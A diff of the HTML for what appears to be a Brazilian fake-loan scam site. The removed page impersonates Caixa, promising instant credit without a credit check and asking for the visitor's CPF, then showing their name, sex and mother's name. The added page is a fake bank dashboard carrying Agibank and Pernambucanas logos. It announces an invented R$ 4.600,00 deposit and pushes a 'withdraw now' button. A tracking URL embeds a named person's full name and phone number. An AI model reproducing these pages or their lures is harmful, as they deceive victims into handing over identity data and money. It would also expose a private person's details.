@@ -1,692 +1,539 @@
-
 <!DOCTYPE html><html lang="pt-BR"><head>
-    
     <meta charset="UTF-8">
-<script src="js/checker.js" data-campaign="49522d4b680124d18162f194871f79ae.e51e428698680cbec7bce2b2a9adcdd4b59ef85f80e80980b61959a5eb529aeda5c78b3d2d2e8bb67d909010cdc4016604088bd19e9c89af251ce0e1ad46a5ff954f463c905d"></script>
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inicio</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <script>
-      tailwind.config = {
-        theme: {
-          extend: {
-            colors: {
-              shopee: {
-                light: "#ffdc00",
-                DEFAULT: "#1a5e9c",
-                dark: "#1a5e9c",
-                laranja: "#f7941c",
-                
-              },
-            },
-          },
-        },
-      };
-    </script>
-    <style>
-      body {
-        font-family: "Poppins", sans-serif;
-        background-color: #fff;
-      }
-      .shopee-gradient {
-        background: linear-gradient(135deg, #FE2C55 0%, #FE2C55 100%);
-      }
-      .card {
-        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
-        border-radius: 16px;
-        transition: all 0.3s ease;
-      }
-      .card:hover {
-        box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
-        transform: translateY(-2px);
-      }
-      .number-highlight {
-        color: white;
-        -webkit-background-clip: text;
-        font-weight: 700;
-      }
-      .btn-shine {
-        position: relative;
-        overflow: hidden;
-      }
-      .btn-shine:after {
-        content: "";
-        position: absolute;
-        top: -50%;
-        left: -50%;
-        width: 200%;
-        height: 200%;
-        background: linear-gradient(
-          to right,
-          rgba(255, 255, 255, 0) 0%,
-          rgba(255, 255, 255, 0.3) 50%,
-          rgba(255, 255, 255, 0) 100%
-        );
-        transform: rotate(30deg);
-        animation: shine 4s infinite;
-      }
-      @keyframes shine {
-        0% {
-          left: -100%;
-          opacity: 0;
-        }
-        10% {
-          left: 100%;
-          opacity: 0.6;
-        }
-        100% {
-          left: 100%;
-          opacity: 0;
-        }
-      }
-      .floating {
-        animation: float 3s ease-in-out infinite;
-      }
-      @keyframes float {
-        0% {
-          transform: translateY(0px);
-        }
-        50% {
-          transform: translateY(-10px);
-        }
-        100% {
-          transform: translateY(0px);
-        }
-      }
-      /* Garantir que os ícones sejam perfeitamente redondos */
-      .icon-circle {
-        width: 44px;
-        height: 44px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        border-radius: 50%;
-      }
-      /* Posição da imagem do cartão */
-      .card-image {
-        position: absolute;
-        right: 5px;
-        top: 35%;
-        transform: translateY(-50%);
-        z-index: 1;
-        width: 150px;
-      }
-      /* Media queries para ajustar posição em telas menores */
-      @media (max-width: 380px) {
-        .card-image {
-          top: 30%;
-          right: 0;
-          width: 130px;
-        }
-      }
+    <title>Banco App- Dashboard</title>
+    <link href="css/TGEIANG3T3rG.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/Xh7RHVlydjCq.css">
+    <link rel="stylesheet" href="css/6C6E1BYJmuGH.css">
+    <link rel="stylesheet" href="css/cT2J6BQEhrqN.css">
+    <script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window,document,"clarity","script","reuxwfsd9v");</script>
 
-      /* Carrossel simplificado */
-      .carousel {
-        position: relative;
-        overflow: hidden;
-        width: 100%;
-        border-radius: 12px;
-      }
-
-      .carousel-inner {
-        display: flex;
-        transition: transform 0.5s ease;
-        height: 100%;
-      }
-
-      .carousel-item {
-        width: 100%;
-        flex-shrink: 0;
-      }
-
-      .carousel-item.active {
-        display: block;
-      }
-
-      .carousel-item:not(.active) {
-        display: none;
-      }
-
-      .carousel-img-container {
-        background-color: #F8F8F8;
-        border-radius: 16px;
-        padding: 20px;
-        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-        margin-bottom: 20px;
-        height: 300px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-      }
-
-      .carousel-img {
-        max-width: 100%;
-        max-height: 260px;
-        object-fit: contain;
-        border-radius: 12px;
-        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-      }
-
-      .carousel-controls {
-        position: relative;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin: 15px 0;
-      }
-
-      .step-number {
-        width: 44px;
-        height: 44px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-weight: bold;
-        border: 2px solid #F8F8F8;
-        color: #000;
-        background-color: #F8F8F8;
-        transition: all 0.3s ease;
-        cursor: pointer;
-        z-index: 2;
-      }
-      .step-number.active {
-        border-color: #fff;
-        background-color: #1a5e9c;
-        color: white;
-      }
-      .step-number.completed {
-        border-color: #faea0d;
-        background-color: #f7941c;
-        color: white;
-      }
-      .step-line {
-        flex: 1;
-        height: 3px;
-        background-color: #ddd;
-        position: relative;
-      }
-      .step-line.active {
-        background-color: #f7941c;
-      }
-
-      .carousel-indicators {
-        display: flex;
-        justify-content: center;
-        margin-top: 15px;
-      }
-
-      .carousel-indicator {
-        width: 10px;
-        height: 10px;
-        border-radius: 50%;
-        background-color: #F8F8F8;
-        margin: 0 5px;
-        cursor: pointer;
-      }
-
-      .carousel-indicator.active {
-        background-color: #1a5e9c;
-        transform: scale(1.3);
-      }
-
-      .carousel-arrow {
-        position: absolute;
-        top: 50%;
-        transform: translateY(-50%);
-        width: 40px;
-        height: 40px;
-        border-radius: 50%;
-        background-color: #F8F8F8;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        cursor: pointer;
-        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        z-index: 10;
-      }
-
-      .carousel-arrow.prev {
-        left: 10px;
-      }
-
-      .carousel-arrow.next {
-        right: 10px;
-      }
-
-      /* Efeitos de transição para telas */
-      .page-transition {
-        transition: opacity 0.4s ease, transform 0.4s ease;
-      }
-
-      .fade-out {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-
-      .fade-in {
-        opacity: 1;
-        transform: translateY(0);
-      }
-
-      .pulse-yellow {
-        position: relative;
-        z-index: 1;
-        color:#FE2C55;
-        animation: pulse-yellow 1.5s infinite;
-      }
-       
-       @keyframes pulse-yellow {
-        0% {
-          box-shadow: 0 0 0 0 rgba(250, 234, 13, 0.7);
-        }
-        70% {
-          box-shadow: 0 0 0 15px rgba(250, 234, 13, 0);
-        }
-        100% {
-          box-shadow: 0 0 0 0 rgba(250, 234, 13, 0);
-        }
-      
-      }
-    </style>
-  </head>
-  <body class="bg-[#f1f1f1]">
-
-      
 <script>
-  window.pixelId = "692cedccf1d8644d9b7bb3bc";
+  window.pixelId = "692678d10aa638a2e08d7981";
   var a = document.createElement("script");
   a.setAttribute("async", "");
   a.setAttribute("defer", "");
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
 
-<script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-
-      
-    <!-- Página principal -->
-    <div id="mainPage" class="max-w-md mx-auto min-h-screen flex flex-col relative page-transition">
-      <!-- Header with Brand -->
-      <div class="flex items-center justify-between p-4 bg-white">
-        <a href="#" class="text-shopee text-2xl"><i class="fas fa-arrow-left"></i></a>
-        <div class="flex items-center">
-          <img src="images/logocaixa2.png" alt="Shopee Logo" class="h-11">
-          <span class="ml-2 text-xl font-bold text-shopee"></span>
+</head>
+<body>
+    <!-- Notificação -->
+    <div id="notification" class="notification d-none">
+        <div class="notification-content">
+            <div class="notification-time">agora</div>
+            <div class="notification-icon">
+                <script data-pagespeed-no-defer="">//<![CDATA[
+(function(){for(var g="function"==typeof Object.defineProperties?Object.defineProperty:function(b,c,a){if(a.get||a.set)throw new TypeError("ES3 does not support getters and setters.");b!=Array.prototype&&b!=Object.prototype&&(b[c]=a.value)},h="undefined"!=typeof window&&window===this?this:"undefined"!=typeof global&&null!=global?global:this,k=["String","prototype","repeat"],l=0;l<k.length-1;l++){var m=k[l];m in h||(h[m]={});h=h[m]}var n=k[k.length-1],p=h[n],q=p?p:function(b){var c;if(null==this)throw new TypeError("The 'this' value for String.prototype.repeat must not be null or undefined");c=this+"";if(0>b||1342177279<b)throw new RangeError("Invalid count value");b|=0;for(var a="";b;)if(b&1&&(a+=c),b>>>=1)c+=c;return a};q!=p&&null!=q&&g(h,n,{configurable:!0,writable:!0,value:q});var t=this;function u(b,c){var a=b.split("."),d=t;a[0]in d||!d.execScript||d.execScript("var "+a[0]);for(var e;a.length&&(e=a.shift());)a.length||void 0===c?d[e]?d=d[e]:d=d[e]={}:d[e]=c};function v(b){var c=b.length;if(0<c){for(var a=Array(c),d=0;d<c;d++)a[d]=b[d];return a}return[]};function w(b){var c=window;if(c.addEventListener)c.addEventListener("load",b,!1);else if(c.attachEvent)c.attachEvent("onload",b);else{var a=c.onload;c.onload=function(){b.call(this);a&&a.call(this)}}};var x;function y(b,c,a,d,e){this.h=b;this.j=c;this.l=a;this.f=e;this.g={height:window.innerHeight||document.documentElement.clientHeight||document.body.clientHeight,width:window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth};this.i=d;this.b={};this.a=[];this.c={}}function z(b,c){var a,d,e=c.getAttribute("data-pagespeed-url-hash");if(a=e&&!(e in b.c))if(0>=c.offsetWidth&&0>=c.offsetHeight)a=!1;else{d=c.getBoundingClientRect();var f=document.body;a=d.top+("pageYOffset"in window?window.pageYOffset:(document.documentElement||f.parentNode||f).scrollTop);d=d.left+("pageXOffset"in window?window.pageXOffset:(document.documentElement||f.parentNode||f).scrollLeft);f=a.toString()+","+d;b.b.hasOwnProperty(f)?a=!1:(b.b[f]=!0,a=a<=b.g.height&&d<=b.g.width)}a&&(b.a.push(e),b.c[e]=!0)}y.prototype.checkImageForCriticality=function(b){b.getBoundingClientRect&&z(this,b)};u("pagespeed.CriticalImages.checkImageForCriticality",function(b){x.checkImageForCriticality(b)});u("pagespeed.CriticalImages.checkCriticalImages",function(){A(x)});function A(b){b.b={};for(var c=["IMG","INPUT"],a=[],d=0;d<c.length;++d)a=a.concat(v(document.getElementsByTagName(c[d])));if(a.length&&a[0].getBoundingClientRect){for(d=0;c=a[d];++d)z(b,c);a="oh="+b.l;b.f&&(a+="&n="+b.f);if(c=!!b.a.length)for(a+="&ci="+encodeURIComponent(b.a[0]),d=1;d<b.a.length;++d){var e=","+encodeURIComponent(b.a[d]);131072>=a.length+e.length&&(a+=e)}b.i&&(e="&rd="+encodeURIComponent(JSON.stringify(B())),131072>=a.length+e.length&&(a+=e),c=!0);C=a;if(c){d=b.h;b=b.j;var f;if(window.XMLHttpRequest)f=new XMLHttpRequest;else if(window.ActiveXObject)try{f=new ActiveXObject("Msxml2.XMLHTTP")}catch(r){try{f=new ActiveXObject("Microsoft.XMLHTTP")}catch(D){}}f&&(f.open("POST",d+(-1==d.indexOf("?")?"?":"&")+"url="+encodeURIComponent(b)),f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.send(a))}}}function B(){var b={},c;c=document.getElementsByTagName("IMG");if(!c.length)return{};var a=c[0];if(!("naturalWidth"in a&&"naturalHeight"in a))return{};for(var d=0;a=c[d];++d){var e=a.getAttribute("data-pagespeed-url-hash");e&&(!(e in b)&&0<a.width&&0<a.height&&0<a.naturalWidth&&0<a.naturalHeight||e in b&&a.width>=b[e].o&&a.height>=b[e].m)&&(b[e]={rw:a.width,rh:a.height,ow:a.naturalWidth,oh:a.naturalHeight})}return b}var C="";u("pagespeed.CriticalImages.getBeaconData",function(){return C});u("pagespeed.CriticalImages.Run",function(b,c,a,d,e,f){var r=new y(b,c,a,e,f);x=r;d&&w(function(){window.setTimeout(function(){A(r)},0)})});})();pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','http://agilemprestimosoficial.site/agil-direto/site/app/dashboard.html?utm_source=FB&utm_campaign=%25F0%259F%258C%25B9CA+%255BECHO%255D+%255BTESTE+DE+CRIATIVO%255D+%255BCRIA+394+VID%255D+%255BCREDAGIL%255D+05%252F05+%25E2%2580%2594+C%25C3%25B3pia%257C120226529720070400&utm_medium=CJ+01+%25E2%2580%2594+C%25C3%25B3pia%257C120226529720270400&utm_content=AD%257C120226529719220400&utm_term=Instagram_Feed&utm_id=120226529720070400&name=FRANCISCO+DE+ASSIS+ALVES+DE+SOUZA&phone=%252862%2529+99988-4851&credit_type=no_guarantee&min_amount=2200&max_amount=35000','82dtZm2p5Q',true,false,'pPg5LRKoHFk');
+//]]></script><img src="images/Q7SyNRRvSozc.png" alt="Agibank" data-pagespeed-url-hash="1869563532" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+            </div>
+            <div class="notification-text">
+                <div class="notification-title"><span class="marca"></span></div>
+                <div class="notification-message">Você recebeu R$ 4.600,00 de <span class="marca"></span>.</div>
+            </div>
         </div>
-        <div class="w-6"></div>
-        <!-- Spacer for balance -->
-      </div>
-
-      <!-- Hero Section -->
-      <div class="text-white rounded-b-3xl relative overflow-hidden" style="min-height: 280px">
-        <img src="images/bannercaixa1.png" class="w-full absolute" alt="">
-      </div>
-
-      <!-- Card de vantagens com sobreposição -->
-      <div class="px-4" style="margin-top: -40px; position: relative; z-index: 10">
-        <div class="bg-[#F8F8F8] card p-6">
-          <h2 class="text-xl font-semibold text-gray-800 mb-5 text-center">
-            Vantagens exclusivas
-          </h2>
-
-          <div class="space-y-5">
-            <div class="flex items-center bg-gray-50 p-4 rounded-xl">
-              <div class="bg-shopee text-white icon-circle mr-4">
-                <i class="fas fa-bolt text-lg"></i>
-              </div>
-              <div>
-                <h3 class="font-medium text-gray-800">Dinheiro na hora</h3>
-                <p class="text-sm text-gray-600">
-                  Direto em sua conta Caixa
-                </p>
-              </div>
-            </div>
-
-            <div class="flex items-center bg-gray-50 p-4 rounded-xl">
-              <div class="bg-yellow-500 text-white icon-circle mr-4">
-                <i class="fas fa-shield-alt text-lg"></i>
-              </div>
-              <div>
-                <h3 class="font-medium text-gray-800">Sem burocracia</h3>
-                <p class="text-sm text-gray-600">Sem consulta ao SPC/Serasa</p>
-              </div>
-            </div>
-
-            <div class="flex items-center bg-gray-50 p-4 rounded-xl">
-              <div class="bg-teal-500 text-white icon-circle mr-4">
-                <i class="fab fa-pix text-lg"></i>
-              </div>
-              <div>
-                <h3 class="font-medium text-gray-800">Pague com PIX</h3>
-                <p class="text-sm text-gray-600">Parcele em até 12 vezes</p>
-              </div>
-            </div>
-          </div>
-
-          <!-- Botão principal -->
-          <button id="btnAtivar" class="pulse-yellow w-full text-white bg-shopee-laranja hover:bg-shopee-laranja text-lg font-bold py-4 rounded-xl mt-6 btn-shine">
-            Ativar meu crédito agora
-          </button>
-
-          <!-- Input CPF (oculto inicialmente) -->
-          <div id="cpfForm" class="mt-6 hidden">
-            <p class="text-gray-700 mb-3">Digite seu CPF para continuar:</p>
-            <div class="flex">
-              <input type="text" id="cpfInput" placeholder="000.000.000-00" class="flex-1 border border-gray-300 rounded-l-xl p-3 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
-              <button id="btnContinuar" class="bg-shopee text-white px-4 py-3 rounded-r-xl">
-                Continuar
-              </button>
-            </div>
-          </div>
-
-          <!-- Confiança -->
-          <div class="flex items-center justify-center mt-5 border-t pt-4 text-gray-600">
-            <i class="fas fa-lock mr-2 text-black"></i>
-            <span class="text-sm text-black">Seus dados estão <span class="font-semibold">protegidos</span> e
-              <span class="font-semibold">seguros</span></span>
-          </div>
-        </div>
-      </div>
-
-      <!-- Como Aplicar (Carrossel) -->
-      <div class="px-4 mt-6">
-        <div class="bg-white card p-5">
-          <h2 class="text-xl font-semibold text-gray-800 mb-5 text-center">
-            Como Aplicar?
-          </h2>
-
-          <!-- Indicadores de etapas (números) -->
-          <div class="carousel-controls">
-            <div class="step-number active" id="step1" data-step="0">1</div>
-            <div class="step-line" id="line1"></div>
-            <div class="step-number" id="step2" data-step="1">2</div>
-            <div class="step-line" id="line2"></div>
-            <div class="step-number" id="step3" data-step="2">3</div>
-          </div>
-
-          <!-- Carrossel -->
-          <div id="carousel" class="carousel">
-            <!-- Botões de navegação -->
-            <div id="prev-btn" class="carousel-arrow prev">
-              <i class="fas fa-chevron-left text-shopee"></i>
-            </div>
-            <div id="next-btn" class="carousel-arrow next">
-              <i class="fas fa-chevron-right text-shopee"></i>
-            </div>
-
-            <!-- Slides -->
-            <div class="carousel-item active">
-              <div class="carousel-img-container">
-                <img src="images/1.jpeg" alt="Etapa 1" class="carousel-img">
-              </div>
-              <p class="text-center text-gray-800 font-medium">
-                <span class="font-bold">1.</span> Tenha em mãos seu CPF e
-                preencha seus dados para ver a proposta
-              </p>
-            </div>
-
-            <div class="carousel-item">
-              <div class="carousel-img-container">
-                <img src="images/2.jpeg" alt="Etapa 2" class="carousel-img">
-              </div>
-              <p class="text-center text-gray-800 font-medium">
-                <span class="font-bold">2.</span> Escolha o valor e o número de
-                parcelas
-              </p>
-            </div>
-
-            <div class="carousel-item">
-              <div class="carousel-img-container">
-                <img src="images/3.jpeg" alt="Etapa 3" class="carousel-img">
-              </div>
-              <p class="text-center text-gray-800 font-medium">
-                <span class="font-bold">3.</span> Pronto! Se aprovado, o
-                dinheiro cairá imediatamente em sua conta Caixa.
-              </p>
-            </div>
-          </div>
-
-          <!-- Indicadores do carrossel -->
-          <div class="carousel-indicators">
-            <div class="carousel-indicator active" data-index="0"></div>
-            <div class="carousel-indicator" data-index="1"></div>
-            <div class="carousel-indicator" data-index="2"></div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Estatísticas de confiança -->
-      <div class="px-4 mt-5">
-        <div class="bg-shopee-dark card p-5 flex justify-between">
-          <div class="text-center">
-            <p class="number-highlight text-2xl font-bold">+1.2M</p>
-            <p class="text-xs text-shopee-light">Clientes</p>
-          </div>
-          <div class="text-center">
-            <p class="number-highlight text-2xl font-bold">4.9/5</p>
-            <p class="text-xs text-shopee-light">Avaliação</p>
-          </div>
-          <div class="text-center">
-            <p class="number-highlight text-2xl font-bold">3 min</p>
-            <p class="text-xs text-shopee-light">Aprovação</p>
-          </div>
-        </div>
-      </div>
-
-      <!-- Simulador -->
-      <div class="px-4 mt-5">
-        <button id="btnSimular" class="bg-white card p-4 flex items-center justify-between w-full text-left">
-          <div class="flex items-center">
-            <div class="bg-gray-100 icon-circle mr-3">
-              <i class="fas fa-calculator text-shopee"></i>
-            </div>
-            <div>
-              <p class="font-medium text-gray-800">Simular Empréstimo</p>
-              <p class="text-xs text-gray-600">
-                Veja opções personalizadas para você
-              </p>
-            </div>
-          </div>
-          <i class="fas fa-chevron-right text-shopee"></i>
-        </button>
-      </div>
-
-      <!-- Depoimentos -->
-      <div class="px-4 mt-5 mb-10">
-        <div class="bg-white card p-4">
-          <div class="flex items-center mb-3">
-            <div class="bg-shopee-dark bg-opacity-20 rounded-full p-2">
-              <i class="fas fa-quote-right text-shopee"></i>
-            </div>
-            <p class="ml-2 font-medium text-gray-800">
-              O que dizem nossos clientes
-            </p>
-          </div>
-
-          <div class="border-l-4 border-shopee-light pl-3 py-1">
-            <p class="text-sm text-gray-600 italic">
-              "Processo super rápido, o dinheiro caiu na minha conta em menos de
-              24h! Recomendo!"
-            </p>
-            <div class="flex items-center mt-1">
-              <p class="text-xs font-medium text-gray-800">Mariana S.</p>
-              <div class="flex ml-2">
-                <i class="fas fa-star text-yellow-400 text-xs"></i>
-                <i class="fas fa-star text-yellow-400 text-xs"></i>
-                <i class="fas fa-star text-yellow-400 text-xs"></i>
-                <i class="fas fa-star text-yellow-400 text-xs"></i>
-                <i class="fas fa-star text-yellow-400 text-xs"></i>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    
-    <!-- Página de CPF (inicialmente oculta) -->
-    <div id="cpfPage" class="max-w-md mx-auto min-h-screen flex flex-col relative bg-white page-transition opacity-0 hidden">
-      <!-- Header com voltar -->
-      <div class="flex items-center p-4 border-b">
-        <button id="btnVoltar" class="text-shopee text-2xl mr-3">
-          <i class="fas fa-arrow-left"></i>
-        </button>
-        <div class="flex items-center">
-          <img src="images/logocaixa2.png" alt="Shopee Logo" class="h-11">
-          <span class="ml-2 text-xl font-bold text-shopee"></span>
-        </div>
-      </div>
-
-      <!-- Conteúdo da página de CPF -->
-      <div class="flex-1 p-6 flex flex-col">
-        <div class="mb-8">
-          <h1 class="text-2xl font-bold text-gray-800 mb-2">
-            Pré-análise de crédito
-          </h1>
-          <p class="text-gray-600">
-            Para prosseguir com a análise do seu crédito, precisamos verificar
-            seus dados. Esta consulta é rápida e não afeta seu score de crédito.
-          </p>
-        </div>
-
-        <div class="bg-blue-50 p-4 rounded-xl mb-8">
-          <div class="flex items-center">
-            <div class="bg-blue-100 icon-circle mr-3 flex-shrink-0">
-              <i class="fas fa-info-circle text-blue-600"></i>
-            </div>
-            <p class="text-sm text-blue-800">
-              Seus dados são protegidos por criptografia e nunca serão
-              compartilhados com terceiros.
-            </p>
-          </div>
-        </div>
-
-        <div class="mb-4">
-          <label for="cpfInputPage" class="block text-gray-700 font-medium mb-2">CPF:</label>
-          <input type="text" id="cpfInputPage" placeholder="000.000.000-00" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent text-lg">
-          <p class="text-sm text-gray-500 mt-1">
-            Digite apenas os números do seu CPF
-          </p>
-        </div>
-
-        <div class="flex items-center mb-6">
-          <input type="checkbox" id="termsCheck" class="mr-2 h-5 w-5 text-shopee">
-          <label for="termsCheck" class="text-sm text-gray-700">Concordo com os
-            <a href="#" class="text-shopee font-medium">Termos de Uso</a> e
-            <a href="#" class="text-shopee font-medium">Política de Privacidade</a></label>
-        </div>
-
-        <button id="btnAnalisar" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white text-lg font-bold py-4 rounded-xl mt-auto btn-shine">
-          Solicitar análise
-        </button>
-
-        <!-- Seção para exibir os resultados da consulta (inicialmente oculta) -->
-        <div id="consultaResultado" class="mt-6 hidden">
-          <div class="bg-gray-50 p-4 rounded-xl">
-            <h3 class="text-lg font-bold text-gray-800 mb-3">
-              Confirme seus dados
-            </h3>
-
-            <!-- Carregando (inicialmente visível dentro da seção de resultados) -->
-            <div id="loadingInfo" class="flex flex-col items-center py-4">
-              <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-shopee mb-3"></div>
-              <p class="text-gray-600">Consultando seus dados...</p>
-            </div>
-
-            <!-- Informações do usuário (inicialmente oculto) -->
-            <div id="userInfo" class="hidden">
-              <div class="space-y-3">
-                <div class="flex justify-between border-b pb-2">
-                  <span class="text-gray-600">Nome completo:</span>
-                  <span id="nomeUsuario" class="font-semibold text-gray-800"></span>
-                </div>
-								  
-                <div class="flex justify-between border-b pb-2">
-                  <span class="text-gray-600">CPF:</span>
-                  <span id="cpfUsuario" class="font-semibold text-gray-800"></span>
-                </div>
-                <div class="flex justify-between border-b pb-2">
-                  <span class="text-gray-600">Sexo:</span>
-                  <span id="sexoUsuario" class="font-semibold text-gray-800"></span>
-                </div>
-                <div class="flex justify-between pb-2">
-                  <span class="text-gray-600">Nome da mãe:</span>
-                  <span id="nomeMae" class="font-semibold text-gray-800"></span>
-                </div>
-              </div>
-
-              <div class="mt-6 flex flex-col space-y-3">
-                <p class="text-sm text-gray-700">Estes dados estão corretos?</p>
-                <button id="btnConfirmar" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white font-bold py-3 rounded-xl">
-                  Sim, continuar
-                </button>
-                <button id="btnCorrigir" class="w-full bg-white border border-shopee text-shopee font-bold py-3 rounded-xl">
-                  Não, desejo corrigir
-                </button>
-              </div>
-            </div>
-
-            <!-- Mensagem de erro (inicialmente oculta) -->
-            <div id="errorInfo" class="hidden">
-              <div class="bg-red-50 p-4 rounded-lg flex items-start">
-                <div class="text-red-500 mr-3 mt-1">
-                  <i class="fas fa-exclamation-circle text-xl"></i>
-                </div>
-                <div>
-                  <h4 class="font-medium text-red-800">
-                    Não foi possível consultar seus dados
-                  </h4>
-                  <p id="errorMessage" class="text-sm text-red-600 mt-1">
-                    Verifique seu CPF e tente novamente.
-                  </p>
-                </div>
-              </div>
-              <button id="btnTentarNovamente" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white font-bold py-3 rounded-xl mt-4">
-                Tentar novamente
-              </button>
-            </div>
-          </div>
-        </div>
-      </div>
     </div>
 
-    <!-- Carregar o script de manipulação de páginas -->
-    <script src="js/page-handler3.js"></script>
+    <!-- Alertinha dos botões -->
+    <div class="mini-alert">
+        <div class="mini-alert-content">
+            <i class="bi bi-exclamation-triangle-fill me-2"></i>
+            <span class="mini-alert-text">Realize o primeiro saque para ativar esta função.</span>
+        </div>
+    </div>
 
-    <!-- Script para preencher o CPF do localStorage -->
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        // Verificar se existe CPF no localStorage
-        const cpfSalvo = localStorage.getItem("cpf");
-        const cpfInputPage = document.getElementById("cpfInputPage");
+    <header class="bg-primary text-white p-3">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <h5 class="mb-0">Olá, <span id="userName">Usuário</span>!</h5>
+                <img src="images/1200px-Pernambucanas.png" alt="Logo" class="logo" width="120" data-pagespeed-url-hash="2474023184" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+            </div>
+        </div>
+    </header>
 
-        if (cpfSalvo && cpfInputPage) {
-          // Formatar o CPF para exibição
-          let cpfFormatado = cpfSalvo;
-          if (cpfSalvo.length === 11) {
-            cpfFormatado = cpfSalvo.replace(
-              /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
-              "$1.$2.$3-$4"
-            );
-          }
+    <main class="container-fluid p-0 mb-5 pb-5">
+        <div class="container mt-3 mb-3">
+            <div class="card rounded-4 text-white conta-card">
+                <div class="card-body p-3">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <span class="fw-medium">Conta</span>
+                        <span class="small">Ver extrato ></span>
+                    </div>
+                    
+                    <div class="mt-4">
+                        <div class="small opacity-75">Saldo em conta</div>
+                        <h3 class="fw-bold mb-0" id="balance">R$ 4.600,00</h3>
+                        <div class="small opacity-75 mb-4">rendendo 102% do CDI</div>
+                        
+                        <button class="btn btn-light text-primary fw-medium rounded-pill px-4 w-100">
+                            Sacar agora!
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
 
-          // Preencher o campo
-          cpfInputPage.value = cpfFormatado;
-          console.log("CPF preenchido automaticamente do localStorage");
-        }
-      });
-    </script>
+        <div class="container mt-4">
+            <div class="finance-actions-carousel">
+                <div class="row flex-nowrap overflow-auto snap-scroll pb-2">
 
-  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card action-item-active mx-auto mb-2" data-mini-alert="false">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="bi bi-cash-coin fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Sacar agora!</p>
+                    </div>
 
-</body></html>
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card bg-light mx-auto mb-2">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="fa-brands fa-pix fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Pix</p>
+                    </div>
+                    
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card bg-light mx-auto mb-2">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="bi bi-upc-scan fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Pagar Boleto</p>
+                    </div>
+                    
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card bg-light mx-auto mb-2">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="bi bi-piggy-bank-fill fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Cofrinhos</p>
+                    </div>
+                    
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card bg-light mx-auto mb-2">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="bi bi-people-fill fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Pagar pessoas</p>
+                    </div>
+                    
+
+                </div>
+            </div>
+        </div>
+
+        <div class="container mt-2">
+            <div id="carouselPromo" class="carousel slide" data-bs-ride="carousel">
+                <div class="carousel-inner">
+
+                    <div class="carousel-item active">
+                        <div class="promo-card bg-dark text-white" data-mini-alert="true">
+                            <div class="promo-content">
+                                <h4 class="promo-title mb-2">Modo Seguro</h4>
+                                <p class="promo-description">Oculte seus investimentos<br>quando estiver na rua. É grátis!</p>
+                                <span class="promo-link">Saiba Mais ></span>
+                            </div>
+                            <div class="promo-image">
+                                <img src="images/aoObAro26xZy.webp" alt="Modo Seguro" data-pagespeed-url-hash="3392937706" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="carousel-item">
+                        <div class="promo-card bg-light" data-mini-alert="true">
+                            <div class="promo-content">
+                                <h4 class="promo-title mb-2">Open Finance</h4>
+                                <p class="promo-description">Ative e aproveite <br> ofertas exclusivas para investir</p>
